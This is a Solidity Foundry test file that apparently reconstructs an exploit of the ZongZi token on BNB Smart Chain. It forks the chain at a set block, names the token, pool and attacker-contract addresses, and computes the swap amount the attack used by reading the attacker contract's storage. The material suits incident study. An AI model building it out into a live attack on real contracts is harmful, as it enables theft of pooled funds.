// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IWBNB.sol";

import "./IZongZi.sol";
import "./IZzf.sol";

IZongZi constant ZongZi = IZongZi(
    payable(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68)
);
IPancakeRouterV2 constant PancakeV2Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
IPancakePairV2 constant BNB_ZongZi_Pool = IPancakePairV2(
    0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe
);
IPancakePairV2 constant USDT_BNB_V2_Pool = IPancakePairV2(
    0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE
);
WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IZzf constant Zzf = IZzf(payable(0xB7a254237E05cccA0a756f75FB78Ab2Df222911b));

contract ZongZiTest is Test {
    address constant attackContract =
        0x0bd0D9BA4f52dB225B265c3Cffa7bc4a418D22A9;

    function setUp() public {
        vm.createSelectFork("bsc", 37272888 - 1);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public view {
        uint256 multiplier = uint256(
            vm.load(attackContract, bytes32(uint256(9)))
        );
        uint256 pairWBNBBalance = BNB.balanceOf(address(BNB_ZongZi_Pool));
        console.log(multiplier);
        uint256 amount1Out = (pairWBNBBalance * multiplier) /
            ((pairWBNBBalance * 100) / address(ZongZi).balance);
        console.log(amount1Out);
    }
}
